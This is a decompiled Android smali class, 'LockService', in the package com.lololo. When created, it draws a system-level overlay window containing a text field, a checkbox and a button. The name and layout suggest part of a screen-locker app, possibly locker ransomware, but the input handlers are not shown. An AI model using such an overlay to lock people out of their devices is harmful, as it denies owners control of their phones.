.class public Lcom/lololo/LockService;
.super Landroid/app/Service;
.source "LockService.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/lololo/LockService$100000000;,
        Lcom/lololo/LockService$100000001;
    }
.end annotation


# instance fields
.field chatHead:Landroid/widget/ImageView;

.field checkBox1:Landroid/widget/CheckBox;

.field editText1:Landroid/widget/EditText;

.field mContext:Landroid/content/Context;

.field myView:Landroid/view/ViewGroup;

.field toast:Landroid/widget/Toast;

.field windowManager:Landroid/view/WindowManager;


# direct methods
.method public constructor <init>()V
    .locals 3

    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/app/Service;-><init>()V

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 4
    .annotation runtime Ljava/lang/Override;
    .end annotation

    move-object v0, p0

    move-object v1, p1

    const/4 v3, 0x0

    move-object v0, v3

    return-object v0
.end method

.method public onCreate()V
    .locals 14
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    move-object v0, p0

    move-object v6, v0

    move-object v7, v0

    const-string v8, "window"

    invoke-virtual {v7, v8}, Lcom/lololo/LockService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/view/WindowManager;

    iput-object v7, v6, Lcom/lololo/LockService;->windowManager:Landroid/view/WindowManager;

    move-object v6, v0

    const-string v7, "layout_inflater"

    invoke-virtual {v6, v7}, Lcom/lololo/LockService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/view/LayoutInflater;

    move-object v1, v6

    move-object v6, v0

    move-object v7, v1

    const/high16 v8, 0x7f03

    const/4 v9, 0x0

    invoke-virtual {v7, v8, v9}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v7

    check-cast v7, Landroid/view/ViewGroup;

    iput-object v7, v6, Lcom/lololo/LockService;->myView:Landroid/view/ViewGroup;

    move-object v6, v0

    new-instance v7, Landroid/widget/ImageView;

    move-object v13, v7

    move-object v7, v13

    move-object v8, v13

    move-object v9, v0

    invoke-direct {v8, v9}, Landroid/widget/ImageView;-><init>(Landroid/content/Context;)V

    iput-object v7, v6, Lcom/lololo/LockService;->chatHead:Landroid/widget/ImageView;

    move-object v6, v0

    move-object v7, v0

    iget-object v7, v7, Lcom/lololo/LockService;->myView:Landroid/view/ViewGroup;

    const/high16 v8, 0x7f05

    invoke-virtual {v7, v8}, Landroid/view/ViewGroup;->findViewById(I)Landroid/view/View;

    move-result-object v7

    check-cast v7, Landroid/widget/EditText;

    iput-object v7, v6, Lcom/lololo/LockService;->editText1:Landroid/widget/EditText;

    move-object v6, v0

    move-object v7, v0

    iget-object v7, v7, Lcom/lololo/LockService;->myView:Landroid/view/ViewGroup;

    const v8, 0x7f050002

    invoke-virtual {v7, v8}, Landroid/view/ViewGroup;->findViewById(I)Landroid/view/View;

    move-result-object v7

    check-cast v7, Landroid/widget/CheckBox;

    iput-object v7, v6, Lcom/lololo/LockService;->checkBox1:Landroid/widget/CheckBox;

    move-object v6, v0

    iget-object v6, v6, Lcom/lololo/LockService;->checkBox1:Landroid/widget/CheckBox;

    new-instance v7, Lcom/lololo/LockService$100000000;

    move-object v13, v7

    move-object v7, v13

    move-object v8, v13

    move-object v9, v0

    invoke-direct {v8, v9}, Lcom/lololo/LockService$100000000;-><init>(Lcom/lololo/LockService;)V

    invoke-virtual {v6, v7}, Landroid/widget/CheckBox;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    move-object v6, v0

    iget-object v6, v6, Lcom/lololo/LockService;->chatHead:Landroid/widget/ImageView;

    const/high16 v7, 0x7f02

    invoke-virtual {v6, v7}, Landroid/widget/ImageView;->setImageResource(I)V

    move-object v6, v0

    iget-object v6, v6, Lcom/lololo/LockService;->myView:Landroid/view/ViewGroup;

    const v7, 0x7f050001

    invoke-virtual {v6, v7}, Landroid/view/ViewGroup;->findViewById(I)Landroid/view/View;

    move-result-object v6

    check-cast v6, Landroid/widget/Button;

    move-object v2, v6

    move-object v6, v2

    new-instance v7, Lcom/lololo/LockService$100000001;

    move-object v13, v7

    move-object v7, v13

    move-object v8, v13

    move-object v9, v0

    invoke-direct {v8, v9}, Lcom/lololo/LockService$100000001;-><init>(Lcom/lololo/LockService;)V

    invoke-virtual {v6, v7}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    new-instance v6, Landroid/view/WindowManager$LayoutParams;

    move-object v13, v6

    move-object v6, v13

    move-object v7, v13

    const/4 v8, -0x2

    const/4 v9, -0x2

    const/16 v10, 0x7d2

    const/4 v11, 0x1

    const/4 v12, -0x3

    invoke-direct/range {v7 .. v12}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    move-object v3, v6

    move-object v6, v3

    const/16 v7, 0x11

    iput v7, v6, Landroid/view/WindowManager$LayoutParams;->gravity:I

    move-object v6, v3

    const/4 v7, 0x0

    iput v7, v6, Landroid/view/WindowManager$LayoutParams;->x:I

    move-object v6, v3

    const/4 v7, 0x0

    iput v7, v6, Landroid/view/WindowManager$LayoutParams;->y:I

    new-instance v6, Landroid/view/View;

    move-object v13, v6

    move-object v6, v13

    move-object v7, v13

    move-object v8, v0

    invoke-direct {v7, v8}, Landroid/view/View;-><init>(Landroid/content/Context;)V

    move-object v4, v6

    move-object v6, v4

    const/high16 v7, 0x33ff

    invoke-virtual {v6, v7}, Landroid/view/View;->setBackgroundColor(I)V

    move-object v6, v0

    iget-object v6, v6, Lcom/lololo/LockService;->windowManager:Landroid/view/WindowManager;

    move-object v7, v0

    iget-object v7, v7, Lcom/lololo/LockService;->myView:Landroid/view/ViewGroup;

    move-object v8, v3

    invoke-interface {v6, v7, v8}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    return-void
.end method
